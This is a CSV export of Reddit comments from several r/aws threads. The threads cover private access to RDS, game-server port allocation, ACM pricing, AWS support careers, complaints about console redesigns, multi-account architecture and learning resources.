g6tchzs,j0droo,A custom ec2 would cost less but then you'll have to manage it. If the hourly rate of the VPN is not an issue I would strongly suggest the VPN with audits from RDS exported directly into CloudWatch.,1.0
g6s20go,j0droo,OpenVPN is free for 2 connections and it’s easy to set up from the AWS marketplace.,7.0
g6qqvo0,j0droo,"You can further secure the bastion by using SSH over Session Manager so they needn't be public. But otherwise, that's basically what I do.

I see other folks in the thread mentioning client vpn. Client VPN is cool and works well, but we aren't comfortable basically extending our vpc boundaries to our home networks and prefer the more targeted connections session manager tunnels give us.",4.0
g6ua06m,j0droo,"&gt;	but we aren't comfortable basically extending our vpc boundaries to our home networks

That’s not how encapsulation, tunneling, or encryption work. It’s also not a concern if your endpoint management game is at least half way decent.

Do you have people using their own personal machines to do work?",1.0
g6uuf3h,j0droo,"My team is not in charge of endpoints. Though the team that _is_ does require and enforce a few endpoint protection measures for all devices, business-provided or otherwise.

But either way I think maybe we can just agree to disagree about how acceptable it is to allow developers to have a access to an always-on connection to (essentially) their datacenter from their house. 

The way I phrased that is a bit of a one-sided way to describe the situation, but I can certainly concede that there are security controls that can be put in place to mitigate the risk. But imo it's easier to only allow targeted direct tunnels to specific security groups instead.

I do appreciate the authorization rules on Client VPN, though, making it much closer to a sort of SDP if you want.",1.0
g6ruq6l,j0droo,The OpenVPN access server is super simple to setup and provision access to your company. Highly recommend it over a bastion host.,3.0
g6scvjj,j0droo,OpenVPN,2.0
g6su3rz,j0droo,"We have two methods.

Method 1: Tunnel via EC2 bastion host. Our SSH is using Okta Advanced Server Access which requires users first to be 2FA'd via Okta then sets up temporary ssh keys for logging in.

Method 2: AWS Client VPN. This is the favorite for developers. It just works without having to deal with tunnels.",2.0
g6ug9bc,j0droo,"AWS VPN is awesome, but expensive AF.",1.0
g7s1o1u,j0droo,Yep. Definitely expensive. It's just much much better than trying to manage the infra ourselves - it's hooked up to Okta as well which is super nice for 2FA.,1.0
g6qtons,j0droo,we have a site-to-site VPN tunnel from our office...or you could spin up an OpenVPN AMI and use that for a client VPN...it's solid,4.0
g6sxxap,j0droo,Site to site Office to VPC VPN. Security Group then only permits certain access to RDS.,1.0
g6t5hai,j0droo,"Still using a Bastion host, but with Tailscaled running on it, I have a mesh VPN and advertise the AWS VPC via it.",1.0
g6t8ghm,j0droo,"Same as you and I create external backups, encrypt them and move them from the same host.

The other solutions still needed an ec2 host.

VPN was silly because I don't want to bridge our networks. All we need is access to RDS.",1.0
g6uadaj,j0droo,"SSM uses HTTPS, which is a wretched protocol for any even remotely heavy SQL lifting.",1.0
g6teflt,j0droo,"&gt; SSH tunnel to the RDS instance through the bastion to use psql

I didn't know that SSH'ing into RDS instances was a thing. Is this a new feature?

I thought you could only talk to them over the Postgres port with a Postgres client.",1.0
g6teg5o,j0droo,"Using bastion as you do, the only difference is that i use agent forwarding, this way the keys are never stored on the bastion.",1.0
g6vgc8y,j0droo,"VPN or Direct Connect + Private Link.

https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/vpc-interface-endpoints.html",1.0
g6qu251,j0droo,AWS Direct Connect,-4.0
g6rkghg,j0droo,SSM,-3.0
g6qnfk3,j0cakk,"Can you just use sub domain for each client/server combo so you don’t have to burn so many IPv4 and use the same ports for everyone?

client01-server01.gs.xrengine.io etc",2.0
g6tc1nt,j0cakk,"Path 2 sounds like a nightmare - DNS changes aren't instant, and even with a short TTL the record will be cached at remote ISPs.",2.0
g6uvwzp,j0cakk,"New names wouldn't be in cache so would be ""instant"", assuming route 53 resolves immediately (i would assume it does but never tested). Use GUID / UUID.",2.0
g6uy25s,j0cakk,"Under normal circumstances, [it takes up to a minute for a change to be reflected in the DNS servers](https://aws.amazon.com/route53/faqs/#Route_53_change_propagation). My concern would be that you can't wait that long to ensure it's available at the client. And if the client checks too early then the NXDOMAIN response will be cached locally, so you can't expect to retry anytime soon.",2.0
g6uyhlx,j0cakk,"I've always run my own dns servers so I can take effect immediately.  Thats an option but extra work. There are things like powerdns, which I experimented with but didn't deploy, which use database backend (or several other options) and can take effect immediately.",2.0
g6v00me,j0cakk,"That would work. Obviously you'd likely want two servers for redundancy, but that's easy enough. My feeling is still though that this is a network issue that should be solved at the network layer.",2.0
g6v3x3r,j0cakk,"I'm not sayijg its not. Some kind of udp proxy that maps to container seems better but ive never done anything like that with containers. That proxy, beside two people on same lan, could simply work by source ip and no other logic needed. Perhaps even iptables rules.. but i havent though about it, just spitting out first thought before brain filter..",2.0
g6v7jur,j0cakk,"Yeah, not really thought it through either but personally I think I'd start with a Network Load Balancer. You can [put one in front of the NGINX ingress controller](https://aws.amazon.com/blogs/opensource/network-load-balancer-nginx-ingress-controller-eks/).",2.0
g6pyqtm,j0cakk,"Quick idea, havent thought through it really deep, from high level it would work, write a simple pythom agent that runs constantly scanning ports say 30k-35k, to see if anything attached, say it gets to 30004 and sees nothing there, so it would set a env variable $PORT1 - $PORT3, mapping the next 3 or 4 avaliable to these variables, this happens on the server that your helm charts are deployed from, that launch the kube instances and ingress, in the helm apply you set a variable in the helm apply that is the values of $PORT1 $PORT2 etc which will allow you to reference these variables in the helm chart and then have a semi dynamic port allocation. Would need to ensure theres some leader election/queue system for ensuring two instances dont try to grab the same ports if they spin up same time.",1.0
g6rwj4h,j0cakk,Why not nodeport?,1.0
g6t8vnm,j0cakk,Do you clients need to be sticky go a server for longer then their udp sessions?,1.0
g6u5lr6,j0cakk,"Specifics matter in all these cases:

* What inbound ports does the client need and what are they used for?
* What outbound ports does the client need and what are they used for?
* What inbound ports does the server need and what are they used for?
* What outbound ports does the server need and what are they used for?
* Who or what initiates the creation of a server?
* How does a client find a server?
* What does your 'behind NAT' solution look like with mediasoup and your other components?

I think regardless the eventual solution is going to be unrelated to your AWS service usage and more to do with your application stack.",1.0
g6ukvaz,j0cakk,"Why are different port numbers needed for each client? Network connections are generally tracked by the IP&amp;Port combination, you should be able to re-use the same two ports across all clients (per game server?)",1.0
g6tk6vg,j0akc1,"this is cool, but some more background would be nice.",7.0
g6w0vu7,j0akc1,[deleted],1.0
g6w3fgc,j0akc1,"They actually move away from RDS to self managed cassandra, based on the workloads they have, hence the title.",1.0
g6pvnwe,j0a8hy,What’s CSE-2?,4.0
g6q2tlz,j0a8hy,"If it’s AWS, I’m guessing Cloud Support Engineer.",2.0
g6q33og,j0a8hy,Correct sorry I wasn’t clear. Cloud support engineer,1.0
g6q2r5f,j0a8hy,"CSE inside AWS? I’ve personally known half a dozen folks that have progressed into CIA/CAA/SA after earning their wings as a CSE there. One person moved into a SWE role in the advertising org at Amazon. Internal moves are encouraged, although changing job family will often need a full loop/interview. 

The on-the-job experience you get will often have greater reach across services than many cloud infrastructure folks. It’s a great place to be. 

Glassdoor reviews should always be taken with a pinch of salt. 

Good luck!

Edit: _generally_ speaking, having experience at AWS will not hinder; _generally_ speaking, it will help!",3.0
g6t0p3x,j0a8hy,"I think the answer is that it depends.

I was a hired as a first generation AWS Support engineer, and that job opened everything for me.  I eventually passed the SDE bar and later moved into management.  I now run a devops team at a major AWS customer.  Many of the support engineers I worked with moved into the various AWS service teams, and others into leadership roles.

The role is what you make of it and can teach you a LOT about how work in the cloud gets done in the real world.

Good luck with the job!",2.0
g6q5pk9,j0a8hy,"I work at AWS in ProServe. But since I was hired remotely post Covid, I’ve never met anyone in person or had the opportunity to run into people at the water cooler just to talk to people in different departments/roles. 

But I see two possibilities since you already have your foot in the door.  Just spitballing here. 

Path 1:  CSE -&gt; TAM -&gt; (associate?) Technical Consultant -&gt; Technical Consultant (I’m here)

This wouldn’t involve any algorithm type interviews and it should allow you to leverage your AWS knowledge, working with customers and you get to develop, do Devops on top of AWS. 

Path 2: SDE. 

Shouldn’t you be able to do the tired r/cscareerquestions path and “grind LeetCode”.  and do an internal transfer?",1.0
g6ql907,j0a8hy,"Depending on the profile you were placed in (assuming you are in the Deployment/""DevOps"" profile based on the content of your post) you will get a pretty deep knowledge for the services in the profile. Your experience and understanding of best practices of AWS services will grow and have a good understanding of common issues. I would say 80% of your day will be between live contacts (phone and chat) and email tickets after you get on-boarded. Your day to day won't really involve any coding which is definitely a hindrance in skill development in the devops space. I spent a little over a year in support there before moving on so feel free to PM me if you have any questions.",1.0
g6vfs5m,j0a8hy,How did you move on?,1.0
g6vn587,j0a8hy,"While working at AWS I was working on improving my Golang skills off hours as well has homelab stuff. Between my homelab (basically only k8s at this point), Golang experience, AWS, and my Ansible and Python experience from a prior job I was able to get a ""devops"" position at a different company doing automation and on-prem k8s for more pay and closer to family so I took it. 

Working for AWS looks good on a resume as there is a reputation for being relatively hard to get in. After a year I could tell I wasn't going to better my development skills in support and the support got repetitive and monotonous so I needed to get out.",1.0
g6p9ikx,j09r56,"&gt;Public SSL/TLS certificates provisioned through AWS Certificate Manager are free. You pay only for the AWS resources you create to run your application.

Public certs (i.e. stuff to front a load balancer) are free. There's only a charge if you want Amazon to run you a full PKI setup with a private CA that's unique to you.",8.0
g6pic03,j09r56,"Yep, they got me with that one once. Deployed a private CA with ACM and forgot about it... until the AWS billing reminder with a 400 dollar addition at the end of the month.",2.0
g6q7n98,j09r56,D: I did the same thing with a kubernetes cluster once. You have my greatest sympathy.,1.0
g6qkb6p,j09r56,We only make these mistakes once. Maybe twice tops. 😬,1.0
g6tlh1p,j09r56,&gt;	maybe twice tops,1.0
g6q7kjk,j09r56,"Thank you for this information! It's very helpful, exactly what I needed to know :D",1.0
g6oyywb,j062ni,Look into S3 with cloudfront. That'll be the option you probably want.,10.0
g6p0itx,j062ni,This is what you want.,2.0
g6qulqj,j062ni,This is the way.,2.0
g6p8i1s,j062ni,What will stop me from going straight to S3 url and download anything/everything without paying?,2.0
g6pbgg3,j062ni,"Watermarked low res photos (which are useless) are in public bucket, the actual products are not",2.0
g6qy54w,j062ni,short lived tokens to access the images when loading the page + non standard naming convention for the images,2.0
g6ouoxg,j062ni,"AWS charges around 10c per GB to download data from S3. S3 storage costs are negligible for data of your size.
How much traffic do you expect to see ? Does your Wordpress machine also reside in AWS ? or is it hosted on a local colo ? What is their network transfer cost ?",1.0
g6p6uqt,j06a5t,"A couple options with labs:

https://amazon.qwiklabs.com/catalog?keywords=introduction%20to%20amazon%20virtual%20private%20cloud%20%28vpc%29&amp;ransack=true

https://networking.aworkshop.io/",1.0
g6p6yec,j06a5t,Oh also look at www.ecsworkshop.com,1.0
g6wdl5r,j06a5t,"Thanks for the suggestions, I'll check them out! Also I wonder why the comment about the Architect Associate course got downvoted?",1.0
g6os62j,j06a5t,Take the AWS Architect Associate course at ACloudGuru. Don’t worry about taking the certification. It just gives you a good overview of AWS.,0.0
g6pcgcr,j05uk0,The R53 changes are so terrible - I loathe having to go into that console now...,58.0
g6ph97d,j05uk0,You don't like having to go through a wizard for every single DNS record entry? It only adds like 6 clicks!,38.0
g6pjzbv,j05uk0,It's only two clicks to first revert the console UI and then enter what I want.,24.0
g6pyvz9,j05uk0,For now! The old console will be deprecated eventually.,11.0
g6tlcex,j05uk0,"True. Also, they will start developing features exclusively for the newer console thus forcing users to switch",3.0
g6pj04i,j05uk0,The r53 console used to be the one place it was easier / less time to change a thing than use the api.  I hate digging up the 5 different fields I need to do an upsert to point an Alb to a record.  With the old console it was 1 click.  The new one is so bad that when the make me switch forever to the new one I’ll just go find the 5 stupid fields myself again.,11.0
g6pkh0j,j05uk0,I guess the real question is would you pay for a console UI that didn't suck?,-14.0
g6r7jn5,j05uk0,We do. Anyone using AWS does. What were you going for with this?,9.0
g6t7qav,j05uk0,Pretty much the only thing that change is good for is promoting the use of IaC via pain.,6.0
g6r7fmc,j05uk0,"Used it for the first time this week. What a terrible, awful user experience.",4.0
g6t7kma,j05uk0,"That new console is the worst of all of the console redesigns they've done.

&amp;#x200B;

""Why have two clicks when 6 will do?""  - Said ~~nobody ever~~ Route53's dev team.",2.0
g6pg98p,j05uk0,"Lol wut? What services has AWS killed? I can't think of a single one. 

Did you write an application using SimpleDB 10 years ago?  Cool, you can still deploy that application today even though AWS released a service meant to superseded simpledb 8 years ago.  

AWS basically never breaks APIs, although they might make those APIs available in new regions. You can still use the AWS Sig V2 algorithm even though Sig V4 has been out for forever.",34.0
g6qlbmy,j05uk0,"I think its a joke, the AWS response was either tongue-in-cheek (because of the snark in the original tweet) or it was a bot doing some NLP that resulted in an amusing response.",14.0
g6qxbr2,j05uk0,ui changes dont kill a service/api?,2.0
g6pgf3d,j05uk0,KMS encrypt in cli v2 no longer works out of the box without doing a bunch of stuff manually.,-17.0
g6pielk,j05uk0,[deleted],34.0
g6ppx3m,j05uk0,"&gt; That's not an example of deprecation at all 

Yes, it is, it's a backwards-incompatible change, which means that existing code works in a way that has been deprecated and must be updated. This can be a huge pain to do if you are operating at scale (and a regular pain even if you are not).",-5.0
g6psjra,j05uk0,[deleted],22.0
g6pt4qu,j05uk0,"The bigger problem is that there was no good reason to change the default behavior. If it was dumb in some way, I could get on that train, but this is just flat out ridiculous.",-16.0
g6pynze,j05uk0,"It’s a legitimate gripe to say: “I think the new version doesn’t make sense and is stupid.”

You’re drawing a lot of flack because you’re conflating what happened (a new major version was released, it’s arguably worse, the old version is still supported) with Google’s practices of dropping support with little warning and no upgrade path—that’s not what’s happening here at all.",19.0
g6ptkwu,j05uk0,[deleted],12.0
g6pu1bi,j05uk0,"Your links shows at least one other person who thought it necessary to post an issue on github: https://github.com/aws/aws-cli/issues/4994

And those are only the people thought to speak up. How else to do you change things for the better if you don't provide feedback?",-7.0
g6puova,j05uk0,[deleted],13.0
g6pvqch,j05uk0,"I read the documentation, then I decided it was stupid that they did that. Then I posted. I'm not sure why you assumed that I don't know anything about upgrading packages.

People usually project, so if I had to guess, you are probably the one who doesn't frequently read documentation or release notes and then gets bitten by the results. That's pretty common in software, so common that teams often auto upgrade, thinking ""we'll get improved security for free"" when it instead results in production outages.

Also, it doesn't break any code, I'm not sure why you may think that it did that. It breaks the process by which you encrypt credentials. The code all works fine, it's just the ability to use KMS out of the box which is hindered.",-8.0
_,j05uk0,,
g6pr2k5,j05uk0,"Arguably it isn't deprecation because the original functionality no longer persists in the new version. Deprecation usually means ""it still works exactly as you expect, but you should stop using it"" Here v1 it was not deprecated because there was no other way, and in v2 it no longer works as expected. I actually argue they just broke it.",-4.0
g6psvi6,j05uk0,[deleted],13.0
g6ptbk8,j05uk0,"It would have been one thing if the cli required you to enter that parameter to work, but it doesn't. So this change is completely hidden from users except then the result is whack. Also WTF would you have the default behavior automatically unbase64 a string. That makes no sense.",-5.0
g6pso1l,j05uk0,"Ah, I missed the manual V1 to V2 upgrade. In that case, I would largely agree. Still, backwards-incompatible version upgrades are less fun than backwards-compatible ones.",3.0
g6psxti,j05uk0,"The real problem is the standard use case is ""encrypt X"" which now no longer works out of the box. It seems the  UI UX team is starting to affect the CLI team implementations as well, it's a real shame.",-5.0
g6q9rf7,j05uk0,"The APIs have not changed. It sounds like you would be better off using the API directly and then you wouldn't have to worry about UI changes.

The over-the-top hyperbole hurts your argument.",6.0
g6pgye5,j05uk0,"The best thing to do with any service provider is to use their API because one day will wake up and say meh thi s UI has been like that forever lets fuck it up .. and at this point they wont even take your feedback into account to improve it. 
The way to go is Infrastructure as a code (Terraform for eg.) or any other mean that uses API calls.
Cheers and have great day/night.
Edit 1: typo",19.0
g6ph2gh,j05uk0,"I suppose I should start mining silicon now to power my machines as well, right ;)",-10.0
g6ptpck,j05uk0,sand/quartz -&gt; silica -&gt; SiO2 -&gt; datacenter,8.0
g6qgbo3,j05uk0,That's how it would work in factorio! Get some spped modules and you're good to go.,3.0
g6ovanw,j05uk0,"They also appear to have adopted Google's policy of sending all feedback &gt; /dev/null.   


Most of the UI re-working they have done is horrible, the EB health UI used to show all the metrics you needed on one screen - but now they have stretched it our horizontally so that it's impossible to fit on one screen, making the entire thing useless. I dropped numerous feedback notes outlining these, even brought them up with some support people, but - nobody really gives a shit (especially with EB, which I don't get the sense AWS wants to support any more).",49.0
g6pa2lp,j05uk0,It's more straightforward to manage DNS records in Godaddy than Route53 at this point.,20.0
g6p2ygh,j05uk0,"Given their changes to the site, it just overall seems like a total waste of time. It isn't better in any way, and for most of them they are much worse.",4.0
g6qqlsd,j05uk0,"Re: ignoring feedback, that’s not entirely true, check out the response to [this Chrome plugin ](https://github.com/tilfin/aws-extend-switch-roles/issues/156) that broke with the new change. They have strong opinions about the look and feel (mostly which I hate) but they do hear the feedback. Rejecting it is entirely within their right I guess.",3.0
g6vcv5g,j05uk0,"This is also the Microsoft way.

Love when they roll out a redesign to something in the Office 365 admin portal and the amount of information on screen is literally halved versus the original.

So. Much. Dead. Space.",1.0
g6ozpig,j05uk0,"With EB you may be right, something new is in the making which could basically make EB obsolete.",-7.0
g6phu7a,j05uk0,EB == EventBridge?,2.0
g6piply,j05uk0,Elastic Beanstalk,5.0
g6pot9z,j05uk0,"Cheers, I am using EventBridge heavily, so would be concerned if it was on the out so soon after release!",1.0
g6p10jl,j05uk0,"Well - the only thing it did on our end was convince us not to use proprietary AWS crap, as they will likely lose interest and stop supporting it in the future (whether we're still using it or not - like Google does).",2.0
g6p16tx,j05uk0,"Although, if you compare it to SWS and Step Functions, they still support SWS, but recommend Step Functions as the way to go.",3.0
g6pahdl,j05uk0,"For this kind of service retirement, I wouldn’t worry too much as it happened before: cloudsearch—&gt; ElasticSearch",1.0
g6pcxm7,j05uk0,"Lost my one click pinned items, sigh",9.0
g6q69m5,j05uk0,"What’s the Google depreciation policy..?
Make something then shut it down after it flops in two years?

Edit: below this comment are google zealots who take offense to the use of flops...enjoy",8.0
g6qg2o3,j05uk0,"Yes, but if by “flops” you mean “does well enough such that it might become competition but doesn’t support itself inside your extremely top heavy organization so you kill it”",4.0
g6qrq0p,j05uk0,"Like it or not, Google has the right to define what they consider a flop.

Could they do a better job at communicating what expectations should be of their products, and that they generally provide no guarantee about the lifetime of the product? Sure.",0.0
g6sl49s,j05uk0,"&gt; Like it or not, Google has the right to define what they consider a flop.

Yeah, and their customer base has the right to avoid using their products due to the perception that they won't stick with anything.  This is quite clearly going on with Stadia since that tends to be it's number one criticism.  It's a reputation that will be incredibly hard to lose now.",2.0
g6qh3q4,j05uk0,exactly.,-5.0
g6qh1mm,j05uk0,Making something and shutting it down as the PM gets promoted and it is being released into beta.,2.0
g6rm4v9,j05uk0,Nothing was actually deprecated. Behavior changed in a new major version. That's one of the reasons to bump the major version: to make changes that aren't backwards compatible. Am I missing something here?,5.0
g6qdhlu,j05uk0,Surely they'll listen this time ...,3.0
g6pd2u1,j05uk0,Just enforces that one should never use the UI.,0.0
g6pkc20,j05uk0,Everything is a UI,-10.0
g6qaro3,j05uk0,No it isn’t,6.0
g6qgn9l,j05uk0,You're really fun. I'm *sure* you didn't know *exactly* what they meant.,11.0
g6qhd62,j05uk0,"Definitely, but let me have fun with it.",-10.0
g6prmix,j05uk0,"Bah, dropped the ""g"".  Yet another reason not to be muffing around trying to configure things manually",2.0
g6ojvsz,j03qek,"Over the last decade I've been building systems to manage 1000s of AWS accounts or building systems that use those accounts or building the services that those accounts use.  

It boils down to this, 1 account per region, per system, per deployment stage.  Data sharing typically takes on a cross account paradigm.  Infrastructure as code and a decent CI/CD setup is the only way to go.  

A typical service I work on has anywhere from 3 to 1,000 ec 2 instances, in 2+ regions and processing, um, lots of data.  Or is totally serverless, shrug.  Depends on the system.  Possibly Athena and glue based data store.  Always security related, I'm a sucker for that shit.

Mostly CFN or CDK, deployed using Code Deploy and Blue Green type deployments.  Lately lambdas and API gateway have become quite popular due the low ops load.  Works good with static sites served from s3 and cognito with federated identities for authn.

Funny enough, the one thing you always need is an authz system.  Spent my career designing those.",20.0
g6oqdho,j03qek,"1 account per system per stage per *region*? The region part seems excessive. Are you planning for the compromise of an account and ensuring the other regions hosting the app are not impacted?

That seems like it will be very hard to use some of the globally available tools like dynamo global tables and global accelerator as they are specific to an account. How do you handle those use cases? 

I also assume you have some central accounts for DNS, etc or that is not managed in AWS perhaps.",10.0
g6ou5t8,j03qek,"If the other region is china, then yes you'll need another set of everything, but otherwise i'd say account per region is a bit over the top.",6.0
g6oulfo,j03qek,"This guy regions.

Edit: you mentioned china, there are other snow forted regions, like gov cloud.",3.0
g6pl2dk,j03qek,what is ths cost of govcloud generally compared to non gov aws solutions,1.0
g6ppv7j,j03qek,"No idea, never paid for it.",1.0
g6s1ddg,j03qek,"True, but gov cloud is relevant only to US gov for security reasons.",1.0
g6pgjn7,j03qek,"I think the 'per region' restriction actually makes a lot of sense. At the end of the day, you can view an account as simply another building block. If your goal is to minimize the dependencies between your building blocks for blast radius, then you should be applying that for your accounts too. 

While rare, it's not out of the question to lose your account for some reason. You don't want to lose your backup infrastructure at the same time as well.",3.0
g6pqilk,j03qek,"Yep, accounts make a great boundary.  Ship your logs to a different account, can't be tampered with.  Put your data behind a different account, only way in is the api.  If you get to play with vpns or direct connect then you start using accounts and publishing endpoints to offer services to customers.",1.0
g6paetq,j03qek,"Things like Route53 become much easier to compartmentalize if you break a system down into regions. For example, if you have a us-west and a us-east version of a system, it's just a lot easier to have two accounts with one having a \*.us-west.abc.com and the other having a \*.us-east.abc.com zone, instead of both services in one account and needing to keep track of what goes where.

I'd say this is more important if you have a very good CI/CD pipeline that can deploy an entire infrastructure in one go from one config file, and that config file has a region parameter. When deploying to multiple regions in one account, it is just too easy to accidentally step on resources.

Also, if your tagging governance isn't great, you can use account-level distinctions to break down your billing per service per region very easily.",2.0
g6oub6x,j03qek,"Yeah, per region.  Um, how do I explain this.  Not all regions are created equal.  So yeah, it's a blast radius consideration.  Hell I've done an account per customer using orgs to orchestrate it.  Excessive?  Maybe, maybe not, it was a sensitive system.

Any system introduces complexity the crazier your considerations and use cases are.  Sometimes features are used or not, depending on if they fit.  But yeah, a lot of engineering goes into replication and fault tolerance to accommodate some of those requirements.",1.0
g6p48ix,j03qek,How do you handle access key generation at that kind of scale? How do you handle cost control?,1.0
g6p5uno,j03qek,"We mostly use sts to assume roles.  The few times we need to actually generate an access key it's ephemeral or rotated regularly and automatically by aforementioned management system.  It's auth is tied to our sso system and has decently usable authz.  It works very well, I made sure my part of it did at least.

Quite a bit of custom software with names that wouldn't make any sense to anyone outside my company.

Cost control isn't really my department.  I'm more the security side.  We do analysis of cost, redesign features sometimes.",2.0
g6qrwb1,j03qek,Thank you!,1.0
g6pf6ql,j03qek,"We use a ""vending machine"" that teams can use to request an account for whatever project they're working on. These come connected to our enterprise org and are super locked down so we can help them move from dev through to prod. The idea is that they can have credentials vended to them and have a fully functional account in a matter of minutes while knowing that there won't be any security issues because it's been pre configured to a basic dev environment.",3.0
g6s98vp,j03qek,That sounds really neat and interesting. Can you explain in detail how you guys do it? :),1.0
g6ob2cf,j03qek,"At my previous consulting engagement they had something like this:
- multiple accounts (about 20?). One was for control (no vpcs) and everything else were based on prod/cert/dev accounts and different accounts for different parts of the organization.
- for infrastructure, we did cloudformation templates
- jenkins for ci/cd
- python scripts for transit gateway management (although we could have gone with a 3rd party.. but decided not to)
- we had moved away from ec2 instances as much as possible and used fargate clusters. Probably had well over 5k clusters.

Account separation allows for better control over what your devs can have access to.",3.0
g6odip5,j03qek,"Disclaimer: I am a consultant at AWS. I am not *your* consultant. My opinions are my own. 

These days I don’t manage or orchestrate environments of any size. We don’t manage customer’s accounts. We don’t touch production accounts. We work with partners that work directly with customers. We *really* want you to work with partners and the partners work with us as needed. 

All of my practical experience comes from re-architecting the processes of my last company as a developer and de facto “cloud architect”.  The company had maybe 30 developers and QA. 

We sold direct access to our microservices for other business to integrate with their websites and mobile apps. We also had ETL jobs. 

We had a combination of Lambdas, ECS/Fargate, EC2, Step functions, DynamoDB, Aurora/Mysql, etc. 

Even though we had built up the competencies internally so we really didn’t need a managed service provider and I was able to hire two good people in operations - one in the US and one in India for full coverage - I still recommended keeping our MSP.

My process. 

1. Move us off of Jenkins to a combination of CodePipeline —&gt; CodeBuild -&gt; internally hosted OctopusDeploy 

2.  Introduce CloudFormation and enforce using it everywhere. For the really custom stuff like adding configuration values to our DynamoDB tables, creating Aurora  database users (using IAM authentication) for different services, etc. create custom resources. CF was also used to deploy lambdas and Fargate tasks. Octopus Deploy agents were used to deploy legacy Windows apps. 

3. Move the different environments to separate accounts and tighten permissions. 

4. Establish monitoring with CloudWatch/New Relic. 

I also suggest you get a “Well Architected Review”. It may cost money, but if you go through AWS and get a partner, I think AWS will reimburse you with credits. 

Btw, this post got downvoted. 

https://www.reddit.com/r/aws/comments/j03qek/what_is_the_largest_aws_environment_you_have/g6o2bm0/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf&amp;context=3

But this is the right answer.  

Btw, don’t contact me about consulting. I’m just going to refer you to the partner page anyway. So this isn’t self serving.....",7.0
g6owpbn,j03qek,Not everyone at AWS is so hands off or partner engaged. We have had AWS people including both our TAM and proserve as well fully engaged and developing in our production accounts.,4.0
g6p8we8,j03qek,"Yep, Proserve will totally contract at that level.  They have some very, very good people.  They've been in my prod systems as well, heh.",3.0
g6oww9d,j03qek,I said we *prefer* partner engagements. I’m not sure what the TAM is allowed to do. But in ProServe we can’t touch production.  We can tell you what to do in production and do a screen share.,1.0
g6oyl1l,j03qek,[deleted],2.0
g6oznuk,j03qek,"spot on answer.  aws provides the services themselves for you to be successful at scale.  you don't need to go external.  aws organizations, control tower, sso, service catalog, etc. all address these concerns and integrate well.  the standard aws iam threaded through all the services is the biggest win.  as soon as you go external, there is the ""potential"" for iam to get complicated, and you can't make the same security assumptions overall because you went outside of aws walls.  there are some solutions that provision into your aws account(s), and i feel these in general, are better than fully external / where you ship your aws data to them.",1.0
g6p0ebz,j03qek,"Exactly, we hosted all third party services in our account. OctopusDeploy is much better than CodePipeline for complicated cross account pipelines. 

Now that I work at AWS, I’ll just give them a CF template that created a CI/CD pipeline to deploy their code. I work mostly in the Serverless space where we can deploy Lambda and Fargate with CF. 

Most companies that have a complicated EC2 setup, have their own deployment process. For that, I guess I would just deliver code and CF for infrastructure.",2.0
g6o8rs8,j03qek,You need to start looking at splitting resources up into separate accounts,1.0
g6r9pev,j03qek,If you have enterprise support consider pinging your TAM.. they'll deep dive on all of this for free,1.0
g6o2bm0,j03qek,Hi there! I work at a aws premier consulting partner. Happy to chat with you if you'd like! Send me a dm if you're interested.,-6.0
g6nyq5o,j04134,"&gt;What if our Private EC2 instance has to return response back to the client? How it'll be routed through ALB as ALB is mostly used for managing incoming traffic

You're aware that once a connection is established, it cuts both ways, right? ALB is generally for HTTP traffic, your EC2 instances respond over the incoming connection.

If your EC2 instances need to *initiate* connections then that's nothing to do with responses. But they can still do that from within a private subnet via a NAT Gateway.",5.0
g6o4qw6,j04134,"Yes, for inbound traffic this is the perfect solution.  Security Groups are 'stateful' which means traffic allowed inbound will also be allowed outbound.",1.0
g6o723m,j04134,"Use ALB for incoming traffic to EC2 hosts on private subnet, but for outgoing traffic from these hosts point the routes for 0.0.0.0/0 to a NAT gateway in a public subnet.",1.0
g6ovhdl,j04134,"Web servers don’t need a public IP if they are behind an ALB. The ALB sends the response to the client, not the web server. 

Put the ALB in a public subnet, and then the web servers in a private subnet. Setup security groups and network ACLs so the web servers accept traffic from the ALB. The ALB accepts traffic from 0.0.0.0/0 on port 80/443.

Note that if your web servers need general Internet connectivity (e.g. to download updates or access a REST API), you’ll need a NAT gateway.",1.0
g6o3u6g,j041h6,"Formerly, I’d recommend Linux Academy courses, particularly the Certified Solutions Architect - Associate and the AWS Essentials. They’re still pretty good though but a recent acquisition has made some of the courses .... well, dumber. I’ve heard decent things about Udemy also. 

Almost every AWS shop out there either uses CloudFormation directly or wrapped in some deployment software for consistency across an org (like Terraform, etc). 

My advice is to take those courses and learn how to do the simple stuff first - setup a Jenkins instance and an AWS role that’s appropriately permission to let it deploy some test servers with CloudFormation templates. Doesn’t matter what it is, a LAMP stack, a Minecraft server. Whatever. Just get used to your infrastructure being code. This is a GIANT culture shift from IT. Everything, except your data, is disposable by design. If I cannot right click on your instance and actually goddamn delete it without your infrastructure automatically standing up a replica (and not losing any data/state), keep at it until you can. 

Not saying it has to be SEAMLESS at first, but do your best to design things that take care of themselves (auto scaling groups) and heal when something bad happens. 

One piece of caution: you will not need to be a programmer, but you will use much more Bash/Powershell/Python that you probably do now. Prepare to Google things and grow your scripting war chest. 

Good luck out there, brother!

Edit: Thanks for the gold. Happy to help with any further questions. We’re all in this shit together.",42.0
g6omnzy,j041h6,"Minor nit: TF doesn’t wrap CloudFormation, it uses the AWS APIs directly. 

You can deploy CloudFormation stacks using TF and it’ll use the corresponding CloudFormation API (https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudformation_stack).

Other resources will use the corresponding API.",9.0
g6obadt,j041h6,"Linux academy was better than it is now, you can still get a good quality course purchasing the course from Adrian Cantrell directly. He was the instructor for the AWS course a lot of people were upset got removed from linux academy.

https://learn.cantrill.io/",6.0
g6p6175,j041h6,"Yeah, this is solid advice right here.",4.0
g6okc51,j041h6,"On top of cloud formation, consider cdk if you want latest and greatest.",3.0
g6oks6y,j041h6,"I would absolutely not do this at first in any, way shape or form. Cdk is a product the also wraps CloudFormation, is hardly finished  AND implies more programming chops than the average sysadmin has out the gate. 

Hell I know mid level DevOps engineers who (often correctly) look at CDK as a needless, over complicated abstraction of the basics. 

Just my opinion, though.",3.0
g6olto9,j041h6,"Yes you'll need to know a bit of programming, but nothing more than the loops and conditionals in cfn. Cdk also gave us the ability to unit test our infra deployment so that is an extra bit of confidence.",3.0
g6op4ti,j041h6,Yeah it’s awesome at what it does for sure.,3.0
g6ojybr,j041h6,"LinuxAcademy is not that great even when before their acquisition.

They have a wide breadth which is consistently okay for a fairly high price.

The smaller specialists in specific tech make higher quality content for (usually) much better prices.

For example if you want AWS Associate certs you want: https://learn.digitalcloud.training.

